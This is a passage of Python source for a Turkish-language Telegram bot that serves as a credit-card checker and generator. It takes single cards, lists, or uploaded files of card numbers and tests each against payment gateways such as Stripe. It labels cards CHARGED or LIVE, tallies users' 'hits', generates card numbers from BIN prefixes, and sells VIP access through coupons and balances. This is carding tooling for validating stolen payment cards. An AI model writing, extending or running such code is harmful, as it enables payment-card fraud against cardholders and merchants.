        await q.message.edit_text("Kullanıcı ID:"); return

    if d == "adm_logs":
        c=db(); cur=c.cursor()
        cur.execute("SELECT user_id, action, created_at FROM logs ORDER BY id DESC LIMIT 20")
        rows=cur.fetchall(); c.close()
        txt=f"{E.BOOK} <b>Son 20 Log</b>\n\n"
        for r in rows: txt+=f"• <code>{r[0]}</code> | {r[1]} | {r[2][:16]}\n"
        await q.message.edit_text(txt or "Log yok.", reply_markup=admin_kb(), parse_mode=ParseMode.HTML); return

# ==================== CC CHECK İŞLEME ====================
def format_result(r):
    if not r: return f"{E.NO} Geçersiz format"
    s = r["status"]
    emo = {"CHARGED":E.FIRE,"LIVE":E.OK,"UNKNOWN":E.WARN,"DEAD":E.NO,"ERROR":E.WARN}.get(s,"•")
    return (f"{emo} <b>{s}</b> | {r['brand']} | {r['gateway']}\n"
            f"<code>{r['cc']}</code>\n"
            f"{E.BOLT} {r['message']} | {r.get('latency',0)}ms")

async def do_cc_check(update, ctx, cc_text, gateway):
    u = update.effective_user
    msg = await update.message.reply_text(f"{E.CHECK} Kontrol ediliyor...")
    loop = asyncio.get_event_loop()

    if gateway == "ALL":
        r = await loop.run_in_executor(None, check_all_gateways, cc_text)
        if not r:
            await msg.edit_text(f"{E.NO} Geçersiz CC formatı"); return
        best = r["best"]
        text = f"{E.VIP} <b>Tüm Gateway Sonucu</b>\n\n"
        for res in r["all"]:
            text += f"• {res['gateway']:15} → <b>{res['status']}</b>\n"
        text += f"\n{E.CROWN} <b>En İyi:</b> {best['status']} ({best['gateway']})"
        await msg.edit_text(text, parse_mode=ParseMode.HTML)
        c=db(); cur=c.cursor()
        cur.execute("UPDATE users SET total_checks=total_checks+1 WHERE user_id=?", (u.id,))
        if best["status"] in ("CHARGED","LIVE"):
            cur.execute("UPDATE users SET hits=hits+1 WHERE user_id=?", (u.id,))
        c.commit(); c.close()
        return

    r = await loop.run_in_executor(None, check_single_cc, cc_text, gateway)
    await msg.edit_text(format_result(r), parse_mode=ParseMode.HTML)
    c=db(); cur=c.cursor()
    cur.execute("UPDATE users SET total_checks=total_checks+1 WHERE user_id=?", (u.id,))
    if r and r["status"] in ("CHARGED","LIVE"):
        cur.execute("UPDATE users SET hits=hits+1 WHERE user_id=?", (u.id,))
    c.commit(); c.close()

# ==================== MESSAGE HANDLER ====================
async def msg(update, ctx):
    u = update.effective_user
    text = update.message.text or ""
    await_ = ctx.user_data.get("cc_await")

    if is_banned(u.id):
        await update.message.reply_text(f"{E.LOCK} Banlısın!"); return
    if not await check_force_join(update, ctx): return

    # Dosya kontrolü
    if update.message.document:
        if await_ == "file":
            ctx.user_data.pop("cc_await", None)
            doc = update.message.document
            if not doc.file_name.endswith(".txt"):
                await update.message.reply_text(f"{E.NO} Sadece .txt"); return
            f = await doc.get_file()
            content = await f.download_as_bytearray()
            lines = [l.strip() for l in content.decode("utf-8", errors="ignore").splitlines() if l.strip()]
            if not lines:
                await update.message.reply_text(f"{E.NO} Boş dosya"); return
            gateway = ctx.user_data.get("cc_gateway", "Stripe")
            m = await update.message.reply_text(f"{E.CHECK} {len(lines)} CC kontrol ediliyor...")
            loop = asyncio.get_event_loop()
            results = []
            for cc in lines[:50]:
                r = await loop.run_in_executor(None, check_single_cc, cc, gateway)
                if r: results.append(r)
            charged = [r for r in results if r["status"]=="CHARGED"]
            live = [r for r in results if r["status"]=="LIVE"]
            text_out = (f"{E.FILE} <b>Dosya Sonucu</b>\n\n"
                        f"{E.CARD} Toplam: <b>{len(results)}</b>\n"
                        f"{E.FIRE} Charged: <b>{len(charged)}</b>\n"
                        f"{E.OK} Live: <b>{len(live)}</b>\n\n")
            for r in (charged+live)[:10]:
                text_out += f"• <b>{r['status']}</b> <code>{r['cc']}</code>\n"
            await m.edit_text(text_out, parse_mode=ParseMode.HTML)
            c=db(); cur=c.cursor()
            cur.execute("UPDATE users SET total_checks=total_checks+?, hits=hits+? WHERE user_id=?",
                        (len(results), len(charged)+len(live), u.id))
            c.commit(); c.close()
            return

    if not text: return

    if await_:
        ctx.user_data.pop("cc_await", None)

        if await_ == "single":
            gw = ctx.user_data.get("cc_gateway", "Stripe")
            await do_cc_check(update, ctx, text, gw); return

        if await_ == "multi":
            gw = ctx.user_data.get("cc_gateway", "Stripe")
            cc_list = [c.strip() for c in text.split(",") if c.strip()]
            m = await update.message.reply_text(f"{E.CHECK} {len(cc_list)} CC kontrol ediliyor...")
            loop = asyncio.get_event_loop()
            results = []
            for cc in cc_list[:50]:
                r = await loop.run_in_executor(None, check_single_cc, cc, gw)
                if r: results.append(r)
            charged = [r for r in results if r["status"]=="CHARGED"]
            live = [r for r in results if r["status"]=="LIVE"]
            out = (f"{E.LIST} <b>Çoklu Sonuç</b>\n\n"
                   f"{E.CARD} Toplam: <b>{len(results)}</b>\n"
                   f"{E.FIRE} Charged: <b>{len(charged)}</b>\n"
                   f"{E.OK} Live: <b>{len(live)}</b>\n\n")
            for r in (charged+live)[:10]:
                out += f"• <b>{r['status']}</b> <code>{r['cc']}</code>\n"
            await m.edit_text(out, parse_mode=ParseMode.HTML)
            c=db(); cur=c.cursor()
            cur.execute("UPDATE users SET total_checks=total_checks+?, hits=hits+? WHERE user_id=?",
                        (len(results), len(charged)+len(live), u.id))
            c.commit(); c.close()
            return

        if await_ == "gen":
            parts = text.split()
            bin_prefix = parts[0]
            count = 1
            if len(parts) > 1:
                try: count = min(int(parts[1]), 50)
                except: count = 1
            bin_clean = re.sub(r'\D', '', bin_prefix)
            if len(bin_clean) < 6:
                await update.message.reply_text(f"{E.NO} BIN en az 6 hane!"); return
            ccs = generate_cc(bin_clean, count)
            if not ccs:
                await update.message.reply_text(f"{E.NO} Üretilemedi!"); return
            out = f"{E.DICE} <b>{count} CC Üretildi</b>\n\n<code>" + "\n".join(ccs) + "</code>"
            await update.message.reply_text(out, parse_mode=ParseMode.HTML); return

        if await_ == "coupon":
            code = text.strip().upper()
            c=db(); cur=c.cursor()
            cur.execute("SELECT * FROM coupons WHERE code=? AND used_by IS NULL", (code,))
            r = cur.fetchone()
            if not r:
                c.close(); await update.message.reply_text(f"{E.NO} Geçersiz kupon."); return
            set_vip(u.id, r["days"])
            cur.execute("UPDATE coupons SET used_by=? WHERE code=?", (u.id, code))
            c.commit(); c.close()
            await update.message.reply_text(f"{E.OK} {r['days']} gün VIP aktif!", parse_mode=ParseMode.HTML); return

        if await_ == "broadcast" and is_admin(u.id):
            c=db(); cur=c.cursor()
            cur.execute("SELECT user_id FROM users"); ids=[r[0] for r in cur.fetchall()]; c.close()
            ok=fail=0
            for i in ids:
                try:
                    await ctx.bot.send_message(i, f"{E.BELL} <b>Duyuru</b>\n\n{text}", parse_mode=ParseMode.HTML)
                    ok+=1; await asyncio.sleep(0.05)
                except: fail+=1
            await update.message.reply_text(f"{E.OK} {ok} | {E.NO} {fail}"); return

        if await_ == "coupon_create" and is_admin(u.id):
            p = text.split()
            if len(p)<2: await update.message.reply_text("Format: KOD GÜN"); return
            code, d = p[0].upper(), int(p[1])
            c=db(); cur=c.cursor()
            try:
                cur.execute("INSERT INTO coupons (code,days,created_at) VALUES (?,?,?)",
                            (code,d,datetime.now().isoformat()))
                c.commit()
                await update.message.reply_text(f"{E.OK} <code>{code}</code> | {d}g", parse_mode=ParseMode.HTML)
            except: await update.message.reply_text(f"{E.NO} Var.")
            c.close(); return

        if await_ == "givevip" and is_admin(u.id):
            try:
                i, d = map(int, text.split())
                set_vip(i, d)
                await update.message.reply_text(f"{E.OK} {i} → {d}g VIP")
                try: await ctx.bot.send_message(i, f"{E.VIP} {d} gün VIP aldın!")
                except: pass
            except: await update.message.reply_text("Format: ID GÜN")
            return

        if await_ == "ban" and is_admin(u.id):
            try:
                i = int(text)
                c=db(); cur=c.cursor()
                cur.execute("UPDATE users SET banned=1 WHERE user_id=?", (i,)); c.commit(); c.close()
                await update.message.reply_text(f"{E.LOCK} {i} banlandı.")
            except: await update.message.reply_text("Geçersiz ID")
            return

        if await_ == "unban" and is_admin(u.id):
            try:
                i = int(text)
                c=db(); cur=c.cursor()
                cur.execute("UPDATE users SET banned=0 WHERE user_id=?", (i,)); c.commit(); c.close()
                await update.message.reply_text(f"{E.OK} {i} unban.")
            except: await update.message.reply_text("Geçersiz ID")
            return

        if await_ == "user_info" and is_admin(u.id):
            try:
                i = int(text); r = get_user(i)
                if not r: await update.message.reply_text("Yok."); return
                await update.message.reply_text(
                    f"{E.USER} <b>Kullanıcı</b>\nID: <code>{r['user_id']}</code>\n"
                    f"İsim: {r['first_name']}\nKullanıcı: @{r['username']}\n"
                    f"Bakiye: {r['balance']}₺\nVIP: {r['vip_until'] or 'Yok'}\n"
                    f"Check: {r['total_checks']} | Hit: {r['hits']}\n"
                    f"Ban: {r['banned']}", parse_mode=ParseMode.HTML)
            except: await update.message.reply_text("Geçersiz ID")
            return

    # Ana butonlar
    if text == f"{E.CARD} CC Checker": await cc_cmd(update, ctx); return
    if text == f"{E.DICE} Gen (BIN)":
        await update.message.reply_text(
            f"{E.DICE} <b>Gen Komutu</b>\n\n"
            f"<code>/gen 411111</code> → 1 CC\n"
            f"<code>/gen 411111 10</code> → 10 CC",
            parse_mode=ParseMode.HTML); return
    if text == f"{E.VIP} VIP Paneli":  await vip_cmd(update, ctx); return
    if text == f"{E.USER} Profilim":   await profil_cmd(update, ctx); return
    if text == f"{E.MONEY} Bakiye":
        r = get_user(u.id)
        await update.message.reply_text(f"{E.MONEY} Bakiye: <b>{r['balance']}₺</b>", parse_mode=ParseMode.HTML); return
    if text == f"{E.GIFT} Günlük Bonus": await bonus_cmd(update, ctx); return
    if text == f"{E.ROCKET} Referans":   await ref_cmd(update, ctx); return
    if text == f"{E.BOOK} Yardım":       await help_cmd(update, ctx); return
    if text == f"{E.ADMIN} Admin Paneli": await admin_cmd(update, ctx); return

# ==================== MAIN ====================
def main():
    db_init()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("cc", cc_cmd))
    app.add_handler(CommandHandler("gen", gen_cmd))
    app.add_handler(CommandHandler("vip", vip_cmd))
    app.add_handler(CommandHandler("profil", profil_cmd))
    app.add_handler(CommandHandler("bonus", bonus_cmd))
    app.add_handler(CommandHandler("ref", ref_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("givevip", givevip_cmd))
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("coupon", coupon_cmd))

    app.add_handler(CallbackQueryHandler(cb))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, msg))

    log.info("Bot başlatılıyor...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
